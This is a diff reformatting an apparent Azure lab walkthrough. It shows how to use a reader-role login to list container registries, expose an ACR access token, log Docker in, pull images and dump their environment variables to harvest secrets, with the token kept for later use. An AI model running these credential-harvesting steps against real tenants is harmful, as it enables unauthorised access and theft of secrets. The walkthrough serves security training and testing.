@@ -6,32 +6,46 @@
 
 ## Steps
 
- - az login -u READER_USER@DOMAIN.LOCAL -p PASSWORD (Authenticate to the Azure environment using the reader role)
+#### 1) Authenticate to the Azure environment using the reader role
 
- - az acr list -o table (List the container registries in the subscription)
+    az login -u READER_USER@DOMAIN.LOCAL -p PASSWORD 
+
+#### 2) List the container registries in the subscription
+
+    az acr list -o table 
 
 ### Generate a Docker login for the registry
 
- - acr=ACR_NAME (Store the container registry in a variable)
+#### 3) Store the container registry in a variable
 
- - loginserver=$(az acr login -n $acr --expose-token --query loginServer -o tsv)
+    acr=ACR_NAME 
 
- - accesstoken=$(az acr login -n $acr --expose-token --query accessToken -o tsv)
+    loginserver=$(az acr login -n $acr --expose-token --query loginServer -o tsv)
 
- - docker login $loginserver -u 00000000-0000-0000-0000-000000000000 -p $accesstoken
+    accesstoken=$(az acr login -n $acr --expose-token --query accessToken -o tsv)
 
- - az acr repository list -n $acr (List the images in the container registry)
+    docker login $loginserver -u 00000000-0000-0000-0000-000000000000 -p $accesstoken
 
- - az acr repository show-tags -n $acr --repository REPOSITORY (List the tags for a specific container registry to enumerate image versions)
+#### 4) List the images in the container registry
 
- - docker pull $loginserver/REPOSITORY:v1 (Pull the image from the container registry)
+    az acr repository list -n $acr 
 
- - docker container run --rm $loginserver/REPOSITORY:v1 env (Check the downloaded image for sensitive credentials by listing our environment variables)
+#### 5) List the tags for a specific container registry to enumerate image versions
+
+    az acr repository show-tags -n $acr --repository REPOSITORY
+
+#### 6) Pull the image from the container registry
+ 
+    docker pull $loginserver/REPOSITORY:v1
+
+#### 7) Check the downloaded image for sensitive credentials by listing our environment variables
+
+    docker container run --rm $loginserver/REPOSITORY:v1 env
 
 ### Make note of the registry credentials for further usage
 
- - echo $loginserver
+    echo $loginserver
 
- - echo $accesstoken
+    echo $accesstoken
    
 
